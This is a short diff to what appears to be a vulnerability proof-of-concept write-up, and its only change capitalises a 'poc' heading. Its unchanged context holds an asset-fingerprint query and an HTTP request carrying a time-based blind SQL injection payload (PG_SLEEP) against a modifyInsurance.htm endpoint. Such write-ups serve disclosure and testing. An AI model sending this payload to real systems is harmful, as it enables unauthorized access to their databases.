@@ -8,7 +8,7 @@
 body="l_c_bar"||body="l_c_center"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5)) HTTP/1.1
